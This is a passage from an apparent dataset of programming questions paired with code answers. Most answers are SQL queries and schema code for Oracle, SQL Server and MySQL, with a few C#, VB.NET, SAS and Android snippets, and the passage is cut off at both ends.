  BEGIN TRY
    BEGIN TRANSACTION;

    -- This reclaims inventory to the Article table
    WITH R AS (
      SELECT ArticleID, SUM(Quantity) ReclaimedQuantity
      FROM InvoiceLine
      WHERE InvoiceID = @InvoiceID
      GROUP BY ArticleID
    )
    UPDATE Article
    SET Quantity = Quantity + R.ReclaimedQuantity
    FROM Article INNER JOIN
         R ON Article.ArticleID = R.ArticleID;

    -- Removes invoice line items
    DELETE FROM InvoiceLine
    WHERE InvoiceID = @InvoiceID;

    -- Removes the invoice header item
    DELETE FROM Invoice
    WHERE InvoiceID = @InvoiceID;

    COMMIT TRANSACTION;
  END TRY
  BEGIN CATCH
    ROLLBACK TRANSACTION;
  END CATCH
END
"
33313,44788,Oracle joining to get desired results,"CREATE table tablea (
  columna NUMBER,
  columnb VARCHAR2(1)
);

CREATE table tableb (
  columna NUMBER,
  columnb VARCHAR2(1)
);

CREATE table tablec (
  columna VARCHAR2(1),
  columnb VARCHAR2(10)
);

INSERT INTO tablea VALUES (1, 'A');
INSERT INTO tablea VALUES (2, 'B');
INSERT INTO tablea VALUES (3, 'C');
INSERT INTO tablea VALUES (4, 'D');
INSERT INTO tablea VALUES (5, 'E');

INSERT INTO tableb VALUES (2, 'X');
INSERT INTO tableb VALUES (3, 'Y');
INSERT INTO tableb VALUES (5, 'Z');

INSERT INTO tablec VALUES ('X', 'Value1');
INSERT INTO tablec VALUES ('Y', 'Value2');
INSERT INTO tablec VALUES ('Z', 'Value3');

COMMIT;

SELECT ta.columna, tc.columnb, ta.columnb
  FROM tablea ta
    LEFT JOIN tableb tb ON (ta.columna = tb.columna)
    LEFT JOIN tablec tc ON (tc.columna = tb.columnb)
ORDER BY 1    
;
"
33624,20786,"is it possible create a sql view from ""horizontal"" to ""vertical""","SELECT period, value, category
FROM 
   (SELECT VendorID, charcge,nocharge
   FROM Table) p
UNPIVOT
   (value FOR category IN 
      (charge,nocharge)
)AS unpvt;
"
7506,5873,Relational SQL query,"select u.Email, v.String
from users u
inner join value v
   on u.Gender = v.PK
"
4254,37623,Alter table table_name Add @name INT,"DECLARE @Col_name varchar(50); SET @Col_name = 'Column_name';
DECLARE @Col_type varchar(10); SET @Col_type = 'INT';

DECLARE @sql nvarchar(50); SET @sql = N'ALTER TABLE Table_name ADD ' + @Col_name + ' ' + @Col_type;         
EXEC sp_executesql @sql
"
12152,54200,Returning relevant date from multiple tables including additional table info (Oracle SQL),"SELECT *
FROM (SELECT OAS.ASM_SUBJECT_ID as ""P Number"", 
             OAS.ASM_ID as ""Assessment ID"", 
             OAS.ASM_START_DATE as ""Assessment Start"",  
             OAS.ASM_END_DATE as ""Assessment End"", 
             ORE.TEAM,
             ORE.WORKER,
             OSE.SEV_ID as ""Event ID"", 
             OSE.SEV_ACTUAL_DATE as ""Event Start"", 
             OSE.SEV_OUTCOME_DATE as ""Event End"",
             ROUND(OAS.ASM_START_DATE -OSE.SEV_ACTUAL_DATE,0) as ""Likely"",
             row_number() over(PARTITION BY  OAS.ASM_ID                                    
                               ORDER BY abs(OAS.ASM_START_DATE -  OSE.SEV_ACTUAL_DATE))as ""Row Number""            
      FROM O_ASSESSMENTS OAS
      LEFT JOIN O_RESPONSIBILITIES ORE
        ON OAS.ASM_ID = ORE.RES_REC_ID
      LEFT JOIN O_SERVICE_EVENTS OSE
        ON OAS.ASM_SUBJECT_ID = OSE.SEV_SUBJECT_ID AND
           OSE.SEV_CODE IN ('ICS_E3','CPINVEST') AND 
           ROUND(OAS.ASM_START_DATE - OSE.SEV_ACTUAL_DATE,0) = 0
      Where OAS.ASM_QSA_ID  IN ('AA1329','AA521') )
WHERE ""Row Number"" = 1
"
11616,53073,Extending IQueryable to modify default query behavior,"public class ThingContext : DbContext
{
   public DbSet<Thing> Things
   {
      get { return Set<Thing>(); }
   }

   public IQueryable<Thing> ThingsWithoutThingy
   {
      get { return Things.Where(x => x.Thingy == null); }
   }
}
"
18531,21533,Grouping in analytical query,"select result.NAME, result.USER_ACCOUNT_ID,MAX(Total_Case_Count),MAX(User_Case_COUNT),MAX(Pending_Case_Count),
            MAX(Rejected_Case_Count),MAX(Pending_For_Payment_Case_Count),MAX(Active_Case_Count) FROM
(
select row_number() over (order by C.CASE_ID asc) as row_index,
   UA.USER_ACCOUNT_ID,
   UA.FIRST_NAME ||' '||UA.LAST_NAME AS NAME,
   COUNT(*) OVER () Total_Case_Count,
   COUNT(*) OVER (PARTITION BY UA.USER_ACCOUNT_ID) User_Case_COUNT,

   CASE 
            WHEN C.CASE_STATUS_ID = 2 THEN COUNT(*) OVER (PARTITION BY C.CASE_STATUS_ID,UA.USER_ACCOUNT_ID) end as Pending_Case_Count,
   CASE 
            WHEN C.CASE_STATUS_ID = 4 THEN COUNT(*) OVER (PARTITION BY C.CASE_STATUS_ID,UA.USER_ACCOUNT_ID) end as Rejected_Case_Count,
   CASE 
            WHEN C.CASE_STATUS_ID = 6 THEN COUNT(*) OVER (PARTITION BY C.CASE_STATUS_ID,UA.USER_ACCOUNT_ID) end as Pending_For_Payment_Case_Count,
   CASE 
            WHEN C.CASE_STATUS_ID In (1,3,5,7,8,9) THEN  COUNT(*) OVER (PARTITION BY C.CASE_STATUS_ID,UA.USER_ACCOUNT_ID) end as Active_Case_Count
FROM CASE C 
INNER JOIN CASE_STATUS CS ON CS.CASE_STATUS_ID = C.CASE_STATUS_ID
INNER JOIN SSO.USER_ACCOUNTS UA ON UA.USER_ACCOUNT_ID = C.CREATED_BY 
inner join sso.User_In_Types uit on uit.USER_ACCOUNT_ID = UA.USER_ACCOUNT_ID 
inner join SSO.USER_TYPES  ut on UT.USER_TYPE_ID = UiT.USER_TYPE_ID 
where UT.APPLICATION_ID = 12 and UT.USER_TYPE_ID = 2170
) result 
GROUP BY result.NAME, result.USER_ACCOUNT_ID
ORDER BY NAME
"
6078,64607,TSQL with Group By Count and Rank,"SELECT n.Name, COUNT(*) as TOTALS,
       RANK() OVER (ORDER BY COUNT(*) DESC) as Total_Rank
FROM @Name n
GROUP BY n.Name
ORDER BY TOTALS DESC;
"
39617,64369,Updating a table after adding Index,"CREATE TABLE [dbo].[dummy](
[id] [int] IDENTITY(1,1) NOT NULL,
[someLongString] [text] NOT NULL,
[someLongText_CheckSum] NOT NULL,
CONSTRAINT [UC_someLongText_CheckSum] UNIQUE (someLongText_CheckSum),
 CONSTRAINT [PK_dummy] PRIMARY KEY CLUSTERED 
(
    [id] ASC
)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]
) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY]

GO
"
22315,7697,SQL change columns to row but keep one column as the column before all the rows,"SELECT Team, [Person 1] As Person_Column
FROM _table
UNION ALL
SELECT Team, [Person 2] As Person_Column
FROM _table
UNION ALL
SELECT Team, [Person 3] As Person_Column
FROM _table
"
18155,23706,INSERT INTO + COMMIT in packages,"create table testcommit (colA varchar2(50)) ;

DECLARE
  PROCEDURE SELFCOMMIT(VAL IN TESTCOMMIT.COLA%TYPE) AS
                BEGIN
                     INSERT INTO TESTCOMMIT(COLA) VALUES(VAL);
                     COMMIT ;
                END SELFCOMMIT ;
  PROCEDURE NOCOMMIT(VAL IN TESTCOMMIT.COLA%TYPE) AS
                BEGIN
                     INSERT INTO TESTCOMMIT(COLA) VALUES(VAL);
                END NOCOMMIT ;              


BEGIN
  INSERT INTO TESTCOMMIT(COLA) VALUES('INITIAL');
  SELFCOMMIT('FIRST SELF COMMIT');
  ROLLBACK ; --KILL TRANSACTION

  INSERT INTO TESTCOMMIT(COLA) VALUES('SECOND MAIN INSERT');
  NOCOMMIT('NO AUTO COMMIT');
  ROLLBACK;


END ;
/
SELECT * FROM TESTCOMMIT;

-->
COLA                                               
-------------------------------------------------- 
INITIAL                                            
FIRST SELF COMMIT  
-->NOTE THE SELFCOMMIT AFFECTS THE ENTIRE TRANSACTION, THUS RENDERING THE ROLLBACK MOOT

--drop table testcommit;
"
5169,32141,JOIN'ing by 3 tables and retrieving field based on content of those tables,"COALESCE(c.name, h.letting_agent, t.letting_agent, 'Unknown (Not set yet)') as Agent
"
1903,66412,Transpose the resulted rows in Oracle 9i,"SELECT 
    max(case when language_name = 'English' then uomt.description else null end)
       as english_description,
    max(case when language_name = 'German' then uomt.description else null end)
       as german_description,
    uomt.unit_of_measure_id
FROM unit_of_measure_trans uomt
INNER JOIN language l ON (uomt.language_id = l.language_id)
group by uomt.unit_of_measure_id
order by uomt.unit_of_measure_id;
"
12324,57587,"Count one cross join, sum another inside T-SQL","select 
  -- 1.1. engineer details
  p.PersonId, p.firstname, p.lastname,
  -- 2. the number of request they closed today
  (
    -- 2.1 the number of requests
    select count(1) 
    from ArchiveRequests ar 
    -- 2.2 By that person
    where ar.AssignedToId = p.personId
    -- 2.3 closed today
    and CONVERT(date, Closed) = @Date
  ) as TicketsClosed,
  -- 3. The time logged today
  (
    select sum(TimeUsed)
    from ArchiveActions aa
    where aa.ActionedById = p.PersonId
    and CONVERT(date, aa.actionDate) = @date
  ) as TimeUsed
-- 1. report, for each engineer, 
from People p
"
8580,36806,Union 'expression must have same datatype as corresponding expression',"Select Column A, Column B, Number A, Number B, Number C, Number D
   From Table A
UNION
Select Column A, Column B, NULL, NULL, NULL, NULL
   From Table B
"
27582,63835,How to update database schema without dropping tables,"ALTER TABLE Comments ADD newColumn INT 
"
5566,6079,Prepared Statements in VB.NET,"Using c As New SqlConnection(ConfigurationManager.ConnectionStrings(""ConnectionString"").ConnectionString)
   c.Open()
using mytransaction = c.BeginTransaction()

   Dim command = New SqlCommand(""INSERT INTO yourtable(image) values (@image)"", c)
   ''# this is specific to the FileUploadControl but the idea is to get the
   ''#image in a byte array; however you do it, it doesn't matter
    Dim buffer(FileUpload1.PostedFile.ContentLength) As Byte
    FileUpload1.PostedFile.InputStream.Read(buffer, 0, buffer.Length)
    command.Parameters.AddWithValue(""@image"", buffer)
    command.ExecuteNonQuery()    
 mytransaction .Commit()
End Using
End Using
"
24172,16882,"Grouping by DATEPART(hh,TimeStamp) to show nightshift, how do I see data for hours past midnight?","select dateadd(hh, datediff(hh, 0, @dt), 0)
"
1739,27593,Compare two string column and result in third column SQL Server,"select *,
case when patindex('%'+STRNEW+'%',STRORIGINAL)>=1 
     then replace(replace (STRORIGINAL,STRNEW,''),',,',',') 
     else STRORIGINAL 
end final_String
from table1
"
31083,49645,Comparing Date/time on Oracle,"if TO_CHAR(updatetime, 'DD-MON-YYYY HH24:MI:SS') != '01-JAN-1900 00:00:01' then 
"
2483,13532,SQL average of sums?,"SELECT AVG(price_sum)
  FROM (SELECT SUM(TicketPrices.price) as price_sum
          FROM TicketPrices, Tickets, ThemeParks 
         WHERE Tickets.TP_Code = ThemeParks.TP_Code 
         GROUP BY ThemeParks.TP_country) t
"
9956,52168,Specifying parameters in the Using clause of an Oracle Merge statement,"DECLARE
  TYPE id_array_type IS TABLE OF NUMBER INDEX BY PLS_INTEGER;
  TYPE options_array_type IS TABLE OF VARCHAR2 (100) INDEX BY PLS_INTEGER;

  t_ids        id_array_type := :ids;
  t_options    options_array_type  := :options;
  v_state_id   NUMBER := :stateId;
BEGIN
  FORALL i IN 1 .. t_ids.count
    EXECUTE IMMEDIATE '
      MERGE INTO worker target
      USING (SELECT :id id, :options options FROM dual) source
      ON (source.id = target.id)
      WHEN MATCHED THEN UPDATE SET target.stateId = :state_id, target.options = source.options'
      USING t_ids (i), t_options (i), v_state_id;
END;
"
34174,50543,"Problem with DISTINCT, SELECT and SORT in TSQL","SELECT  DATENAME(MONTH, DATEADD(month, b_month - 1, 0)) + ' ' + SUBSTRING(CAST(b_year AS VARCHAR), 3, 4)
FROM    (
        SELECT  DISTINCT YEAR([BEGIN]) AS b_year, MONTH([BEGIN]) AS b_month
        FROM    RECORDS
        ) q
ORDER BY
        b_year, b_month
"
17871,48538,look for specific sql requests in java project using regex,"select((.|\n)*)from((\n|\s)*)\(((\n|\s)*)select((.|\n)*)\)\w
"
8914,67749,"Select all rows, and the average price of all rows where customerid = x","DECLARE   @id INT
SET       @id = 1

SELECT    id, 
          customerid, 
          price, 
          productname,
          (
              SELECT   AVG(price) 
              FROM     invoice_lines i 
              WHERE    i.customerid = o.customerid
          )AS avgprice
FROM invoice_lines o
WHERE o.id = @id
"
34705,46788,Query different table when column exist,"select (case when type = 'type1' then (select field from table1) else (select field from table2) end) as a from table;
"
38092,4535,How do I do this ridiculous SQL multiple join statement?,"SELECT
   article.articleId,
   article.articleName,
   article.articleStoryTypeId,
   artIndustry.industryName,
   author.userPrefix,
   author.userMiddleName,
   article.articleStatus,
   article.articleCreateDate,
   article.articleModifyDate,
FROM
   users
LEFT JOIN clickTrack
 ON users.userId = clickTrack.clickUserId
LEFT JOIN article
 ON clickTrack.clickDocumentId = article.articleId
LEFT JOIN users author
 ON author.userId = article.articleAuthorId
LEFT JOIN industry artIndustry
 ON artIndustry.industryId = article.articleIndustryId
WHERE ((clickTrack.clickDocumentTable = 'breaking')
     OR (clickTrack.clickDocumentTable = 'article'))
  AND article.articleCreateDate > '1/1/2008 0:00:00 AM'
  AND users.industryId = 1
GROUP BY
   article.articleId,
   article.articleName,
   article.articleStoryTypeId,
   artIndustry.industryName,
   author.userPrefix,
   author.userMiddleName,
   article.articleStatus,
   article.articleCreateDate,
   article.articleModifyDate,
Order By article.articleId
"
39851,44501,Trim Special Char from SQL String,"SELECT CASE WHEN col LIKE ';%' 
  THEN STUFF(col,1,1,'') ELSE col END
  FROM dbo.table;
"
1929,4591,Combine a Join/Subselect Query with a SUM MYSQL Query,"SELECT *
FROM table1 t
INNER JOIN
(SELECT MAX(id) AS id, SUM(item_qt) AS sum_item_qt
 FROM table1
 WHERE timestamp >= DATE_SUB(NOW(), INTERVAL 5 MINUTE)
 GROUP BY member_id) AS t2
ON t2.id = t.id
ORDER BY t.id DESC
LIMIT 10
"
25280,51794,Detect Anomaly Intervals with SQL,";WITH Filtered
AS
(
    SELECT ROW_NUMBER() OVER (ORDER BY dateField) RN, dateField, Status
    FROM Test    
)
SELECT F1.RN, F3.MinRN,
    F1.dateField StartDate,
    F2.dateField Enddate
FROM Filtered      F1, Filtered F2, (
SELECT F1a.RN, MIN(F3a.RN) as MinRN
FROM Filtered      F1a
   JOIN Filtered F2a ON F1a.RN = F2a.RN+1 AND F1a.Status = 2 AND F2a.Status <> 2
   JOIN Filtered F3a ON F1a.RN < F3a.RN AND F3a.Status <> 2
GROUP BY F1a.RN ) F3 
WHERE F1.RN = F3.RN AND F2.RN = F3.MinRN
"
26027,60346,Count the difference between two nbr i in the query?,"select 
  max,
  min,
  max - min as difference
from 
  aggregates 
where 
  name='tagg' and date between date1 and date2; 
"
16653,9125,Extract string after specific data occurrence,"declare @str varchar(200) = '[servername].[tablename].[dbo].[tablename.csv]'

select substring(@str,(PATINDEX('%dbo%',@str)+6), 
(PATINDEX('%.csv%', @str) - (PATINDEX('%dbo%',@str)+6)))
"
7514,17037,Will it be possible to join table with itself,"CREATE TABLE #STUDENT(ID INT, NAME VARCHAR(10), STUDENT_YEAR INT);
INSERT INTO #STUDENT VALUES(1,'FOO1',1);
INSERT INTO #STUDENT VALUES(2,'FOO2',1);
INSERT INTO #STUDENT VALUES(3,'FOO3',2);
INSERT INTO #STUDENT VALUES(4,'FOO4',2);
INSERT INTO #STUDENT VALUES(5,'FOO5',2);
INSERT INTO #STUDENT VALUES(6,'FOO6',3);


SELECT * FROM (
    SELECT 
        ROW_NUMBER() OVER (ORDER BY S1.ID ASC) RN,
        S1.ID AS [ID_1], S1.NAME AS [NAME_1],S1.STUDENT_YEAR AS [YEAR_1]  
    FROM #STUDENT S1
    where s1.STUDENT_YEAR=1
) T1    
FULL JOIN (
    SELECT 
        ROW_NUMBER() OVER (ORDER BY S2.ID ASC) RN,
        S2.ID AS [ID_2], S2.NAME AS [NAME_2],S2.STUDENT_YEAR AS [YEAR_2]  
    FROM #STUDENT S2
    where s2.STUDENT_YEAR=2
) T2 ON T1.RN = T2.RN
FULL JOIN (
    SELECT 
        ROW_NUMBER() OVER (ORDER BY S3.ID ASC) RN,
        S3.ID AS [ID_3], S3.NAME AS [NAME_3],S3.STUDENT_YEAR AS [YEAR_3]  
    FROM #STUDENT S3
    where s3.STUDENT_YEAR=3
) T3 ON T1.RN = T3.RN
"
35805,17304,How to replace a whole observation working on a SAS file through IML,"/* get column names ONE TIME */
use (db);
   read next var _ALL_ into temp[colname=varNames]; /* get names of cols */
close (db);

/* read index checkObs and write to temp*/
edit (db);
read point (checkObs) into temp; /* Read an entire row*/
temp[nVarToUpdate] = 1; /* I would like to update some values*/
do i = 1 to ncol(temp);
   call valset(varNames[i], temp[i]); /* update scalar variables */
end;
replace point (checkObs) var _all_;
close (db);
"
26925,41983,How to check whether table is empty or not in android?,"DBHelper dbHelper = new DBHelper(context);
SQLiteDatabase db = dbHelper.getWritableDatabase();        
String query = ""SELECT * FROM allquestions"";
Cursor cursor = db.rawQuery(query, null);
int count = cursor.getCount();
cursor.close();
return count
"
39993,73877,How to perform operations on dates in queries?,"SELECT DATEADD('day',100, ""date"") FROM ""history"";
"
11865,60190,Another Complex SQL Query,"select *
 from MedicalImaging mi
 where mi.mcgid = 1032
   and not exists (select null
                     from Invoice i
                    inner join InvoiceFields f
                       on i.invoicenumber = f.invoicenumber
                    where i.studyid = mi.mcgid
                      and i.void = 0
                      and f.typeOfExam = mi.imaging
                      and f.Indication = mi.indication
                      and f.PatientID = 'PT30')
"
532,20609,Order By before Group By in Mysql,"SELECT minder_id, MIN(service_type_id)
FROM  minder_service
WHERE minder_id = 238 AND deleted_at IS NULL
GROUP BY minder_id
"
12658,47399,SQL match on letter and number arrangement without using regular expressions,"SELECT myCol 
FROM myTable 
WHERE SUBSTRING(myCol, 1 , 1) >= 'A' 
AND SUBSTRING(myCol, 1 , 1) <= 'Z' 
AND SUBSTRING(myCol, 2 , 1) >= 'A' 
AND SUBSTRING(myCol, 2 , 1) <= 'Z' 
AND SUBSTRING(myCol, 3 , 1) >= '0' 
AND SUBSTRING(myCol, 3 , 1) <= '9'
"
31845,30503,Speeding up a SQL query with indexes,"CREATE NONCLUSTERED INDEX IX_code_company_createddate
ON Products(code, company, createddate)
INCLUDE (price);
"
18039,8371,Mysql Comparison in where clauses between two subqueries,"INSERT INTO table1 (field1, field2) SELECT ?, ?
WHERE (SELECT SUM(x) FROM table2 WHERE ..) <= (SELECT SUM(y) FROM table3 WHERE ..)
"
12949,437,Replace NULL with string if another cell isn't NULL,"select (case when T.Name is null then NULL
             when P.[Name]+' - '+P.[Description] is NULL then 'KanBan'
             else P.[Name]+' - '+P.[Description]
        end) AS Sprint
"
292,64480,Search for a specific value in a column in Oracle,"SELECT SUBSTR (expr, INSTR (expr, '=') + 1) subdoctypeval
  FROM (SELECT REGEXP_SUBSTR ('DocType=1***SubDocType=2***MinValue=123',
                              'SubDocType=[^*]+',
                              1,
                              1)
                   expr
          FROM DUAL)
"
9369,44156,Simple Query to get exact result,"select 
t1.EmpName as EmoName, t2.EmpName as ManagerName
from   Employee t1 
LEFT join Employee t2 on t1.ManagerId = t2.EmpId
"
26162,7297,Building comment system for different types of entities,"CREATE TABLE comment (
  id SERIAL PRIMARY KEY,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT (now()),
  updated_at TIMESTAMP WITH TIME ZONE,
  account_id INT NOT NULL REFERENCES account(id),
  text VARCHAR NOT NULL,

  -- commentable sections
  product_id INT REFERENCES product(id),
  photo_id INT REFERENCES photo(id),
  article_id INT REFERENCES article(id),

  -- constraint to make sure this comment appears in only one place
  CONSTRAINT comment_entity_check CHECK(
    (product_id IS NOT NULL)::INT
    +
    (photo_id IS NOT NULL)::INT
    +
    (article_id IS NOT NULL)::INT
    = 1
   )
);

CREATE TABLE comment_likes (
  id SERIAL PRIMARY KEY,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT (now()),
  updated_at TIMESTAMP WITH TIME ZONE,
  account_id INT NOT NULL REFERENCES account(id),
  comment_id INT NOT NULL REFERENCES comment(id),

  -- comments can only be liked once by an account.
  UNIQUE(account_id, comment_id)
);
"
38536,50551,Executing MySql from Command Prompt window,"mysql > source c:\create_database.sql
"
19625,3264,Values corresponds to NOT AT ALL in MYSQL,"select *
from Airline a
where not exists(
  select 1
  from Travel t
  join Location l
  on t.from = l.port
  where t.Code = a.code
    and l.Country = 'France'
 )
"
12685,15316,Splitting flat file rows to multiple flat files SSIS,"int val = Convert.ToInt32(Dts.Variables[""Counter""].Value);
Dts.Connections[""destinationConnectionName""].ConnectionString = ""c:\\yourpath\\"" + val.ToString() + "".txt"";
"
4886,47481,Auto Generated Id Using Fluent NHibernate with Oracle 11g,"Id(x => x.Id, ""KEY"").GeneratedBy.Increment();
"
31498,26938,How to replace values which are equal in a column in SQL?,"UPDATE Your_Table
SET Name = Name + CAST(RN AS varchar(1)) FROM -- varchar(10)
                    (SELECT ROW_NUMBER() OVER(PARTITION BY Name ORDER BY ID) AS RN
                     FROM Your_Table) AS A
"
17880,29613,SQL Identify related rows (Hierarchal),"-- Reset LINK
UPDATE LinkedRows SET LINK = NULL;

-- Declare variables
DECLARE @LinkCounter int;
DECLARE @myID int;
DECLARE @myCOL1 nvarchar(50);
DECLARE @myCOL2 nvarchar(50);
DECLARE @myLINK1 int;
DECLARE @myLINK2 int;
-- Init group counter
SET @LinkCounter = 0;

DECLARE RowCursor CURSOR FOR 
SELECT ID, COL1, COL2 FROM LinkedRows ORDER BY ID;

OPEN RowCursor;

-- Run through all records
FETCH NEXT FROM RowCursor INTO @myID, @myCOL1, @myCOL2;
WHILE @@FETCH_STATUS = 0 -- More records
    BEGIN
        DECLARE LinkCursor CURSOR FOR SELECT DISTINCT(LINK) FROM LinkedRows WHERE (COL1 = @myCOL1 OR COL1 = @myCOL2 OR COL2 = @myCOL1 OR COL2 = @myCOL2) AND NOT LINK IS NULL;
        OPEN LinkCursor;
        FETCH NEXT FROM LinkCursor INTO @myLINK1;
        IF @@FETCH_STATUS = 0 -- At least one record
            BEGIN
                FETCH NEXT FROM LinkCursor INTO @myLINK2;
                IF @@FETCH_STATUS = 0 -- Two records present - Link two groups
                    BEGIN
                        -- SELECT 'Link', @myLINK1, @myLINK2; -- Debug
                        -- Join the groups - use the first LINK id
                        UPDATE LinkedRows SET LINK = @myLINK1 WHERE LINK = @myLINK2;
                        -- Add the new record to the group
                        UPDATE LinkedRows SET LINK = @myLINK1 WHERE ID = @myID;
                    END;
                ELSE -- Only one group - assign new record to existing group
                    BEGIN
                        -- SELECT 'Assign', @myLINK1; -- Debug
                        UPDATE LinkedRows SET LINK = @myLINK1 WHERE ID = @myID;
                    END;
            END;
        ELSE -- New group
            BEGIN
                SET @LinkCounter = @LinkCounter + 1;
                -- SELECT 'New', @LinkCounter;
                UPDATE LinkedRows SET LINK = @LinkCounter WHERE ID = @myID;
            END;
        CLOSE LinkCursor
        DEALLOCATE LinkCursor
        -- Get next record
        FETCH NEXT FROM RowCursor INTO  @myID, @myCOL1, @myCOL2;
    END;
CLOSE RowCursor;
DEALLOCATE RowCursor;
"
37654,42383,Orace/SQL multiple group by," select    aT.PieceNo, aT.Created,count(*)
 from      send_piece aT 
 where     message_no in (7104, 7113)
 and       aT.Created > To_Timestamp('01-JAN-14 00:00:00', 'DD-MON-YY HH24:MI:SS')
 group by  aT.PieceNo, aT.Created;
"
30822,26209,SQL Query to get formatted result from one table,"declare @T table
(
  Primary_Key char(1),
  Name varchar(10),
  Age int
)

insert into @T values
('A'    ,      'Kyle'   ,   45),
('B'    ,      'Rob'    ,   66),
('C'    ,      'Dhruba' ,   77),
('D'    ,      'Susan'  ,   99),
('E'    ,      'Steve'  ,  100),
('F'    ,      'Mili'   ,   34),
('G'    ,      'Grover' ,   54),
('H'    ,      'Alan'   ,   76),
('I'    ,      'Paul'   ,   16)

;with C as
(
  select *,
         (row_number() over(order by Primary_Key) - 1) / 3 as rn
  from @T
)
select stuff((select ', '+C2.Primary_Key+', '+C2.Name+', '+cast(C2.Age as varchar(10))
              from C as C2
              where C1.rn = C2.rn
              for xml path(''), type).value('.', 'varchar(max)'), 1, 2, '') as ColumnA

from C as C1
group by C1.rn 
order by C1.rn
"
6389,8326,How to handle NULL values in multiple SQL table joins,"SELECT SC_NumberCart.Number, SC_Packages.PkgName, SC_Features.FeatureName  
FROM SC_NumberCart 
LEFT JOIN SC_Packages ON SC_NumberCart.PkgID = SC_Packages.PkgID 
LEFT JOIN SC_FeatureCart ON SC_NumberCart.NumberID = SC_FeatureCart.NumberID 
                            AND SC_NumberCart.RecordID = SC_FeatureCart.RecordID 
LEFT JOIN SC_Features ON SC_FeatureCart.FeatureID = SC_Features.FeatureID 
WHERE SC_NumberCart.CpyID = @CpyID
"
39310,31988,How to combine to values from two records,"Select CASESTUDY_CLIENT.CLEINT_FNAME as First_Name,  
       casestudy_client.client_sname as Surname, 
       casestudy_client.client_Phonenumber as Phone_number, 
       casestudy_event.event_totalcost- sum(casestudy_transaction.transaction_value) as Unpaid_balance
  from casestudy_client
  inner join casestudy_event
    on casestudy_client.client_id = casestudy_event.event_clientid
  inner join casestudy_transaction
    on casestudy_event.event_id = casestudy_transaction.transaction_eventid
  where casestudy_event.EVENT_EVENTSTAGE ='complete' and 
        casestudy_event.event_totalcost > casestudy_transaction.transaction_value
GROUP BY CASESTUDY_CLIENT.CLEINT_FNAME, casestudy_client.client_sname, casestudy_client.client_Phonenumber, casestudy_event.event_totalcost
"
39080,20896,select only matching records from two tables,"SELECT *
FROM class1 c1
JOIN class2 c2 ON c1.groupName = c2.groupName
        AND c1.subgroup = c2.subgroup
WHERE
    (
    SELECT COUNT(DISTINCT ind)
    FROM class2 c2a
    WHERE c2a.groupName = c1.groupName
        AND c2a.subgroup = c2a.subgroup
    ) = 2
  AND
    (
    SELECT COUNT(DISTINCT subgroup)
    FROM class1 c1b
    WHERE c1b.groupName = c1.groupName
    ) =
    (
    SELECT COUNT(DISTINCT subgroup)
    FROM class2 c2b
    WHERE c2b.groupName = c2.groupName
    )
"
23903,66865,SQL query to get a result based on count of records in other table,"select item_id 
from items i
where not exists 
(
  select * 
  from items_to_orders ito
  join orders o on o.order_id = ito.order_id 
  where ito.item_id = i.item_id
  and o.order_status = 0
);
"
12786,16513,Triple Inner Join preserving headings,"SELECT
p.personName
,MAX(CASE WHEN f.featureName='Weight' THEN d.value END) Weight
,MAX(CASE WHEN f.featureName='Age' THEN d.value END) Age
,MAX(CASE WHEN f.featureName='Height' THEN d.value END) Height
FROM people p
LEFT JOIN data d ON(p.personId=d.pId)
LEFT JOIN features f ON(f.featureId=d.fId)
GROUP BY d.pId
"
33418,15429,SQL User Function (and performance): combining SELECT and IF in multiple RETURN statements,"create function fn_x()
returns @x table
(
    col1 int,
    col2 varchar(20)
)
as
begin
    -- declare @Something1 ...

    if @Something1
        insert @x select ...
    else if @Something2
        insert @x select ...
    else
        insert @x select ...
    return
end
go
"
27441,61770,MYSQL - Union SELECT & GROUP BY Not working,"select cl.id, cl.user_id,
       coalesce(m.fullname, g.fullname) as fullname,
       cl.checkout_as
from checkout_log cl left join
     members m
     on cl.user_id = m.id and cl.checkout_as = 'member' left join
     guests g
     on cl.user_id = g.id and cl.checkout_as = 'guest';
"
35840,26847,Order by conditioned to a field,"select * from Products p
left join Discounts d on p.category = d.category
order by offer desc,IF(offer,price,p.category), p.category, price
"
14249,66616,how to store sql results into variable in sql server 2008,"DECLARE @Rev1 int
DECLARE @Rev2 int
DECLARE @Rev3 int
DECLARE @Rev4 int
SELECT 
    @Rev1 = SUM(CASE WHEN MAIN_SAT =1 THEN 1 ELSE 0 END),
    @Rev2= SUM(CASE WHEN MAIN_EKL =1 THEN 1 ELSE 0 END),
    @Rev3= SUM(CASE WHEN MAIN_LAM =1 THEN 1 ELSE 0 END),
    @Rev4= SUM(CASE WHEN MAIN_JAC =1THEN 1 ELSE 0 END)
FROM MyTable
WHERE QTR = 1
    AND ACTIVE_FLAG = 1
"
9536,12562,T-SQL to find length of time a particular value is in-range,"select a.t, b.t  --- and what other columns you need
from tbl a -- implicitly each row of table
cross apply (
    select top(1) * -- the first, going upwards along b.t
    from tbl b
    where a.t < b.t -- look for records with later t than the source row
      and <here's your function between a row and b row>
    order by b.t asc
) x
"
28031,20067,SQL Server: Is it possible to get procedure or table creation and last alter date?,"SELECT name, create_date, modify_date 
FROM sys.tables

SELECT name, create_date, modify_date 
FROM sys.procedures
"
23088,74571,SQL Query: Visited the site each day for 30 consecutive days,"Id, LastVisit, DaysConsecutivelyVisited
"
32294,10366,UPDATING a section of string for column,"update #a_table set names = replace(names, 'C;', 'X;Y;')
"
20059,39987,Db Date Partition Change,"alter table orders enable row movement;
"
31726,20076,How do I get a collection of every value in every column of a table?,"DECLARE @SpecialColumnsCount INT;
DECLARE @Counter INT;
DECLARE @CurrentColumnName VARCHAR(255);
DECLARE @ExecSQL VARCHAR(1024);
SET @Counter = 1;

CREATE TABLE #ProtectedValues(RecordID INT IDENTITY(1,1) PRIMARY KEY NOT NULL, Value VARCHAR(255));
DECLARE @SpecialValuesColumns TABLE (RecordID INT IDENTITY(1,1) PRIMARY KEY NOT NULL, ColumnName VARCHAR(255));

INSERT INTO @SpecialValuesColumns (ColumnName)
SELECT COLUMN_NAME
FROM INFORMATION_SCHEMA.COLUMNS
WHERE 
TABLE_NAME = 'SpecialValues' AND
DATA_TYPE = 'varchar' AND
CHARACTER_MAXIMUM_LENGTH = 255

SELECT @SpecialColumnsCount = COUNT(*) FROM @SpecialValuesColumns

WHILE @Counter <= @SpecialColumnsCount
BEGIN
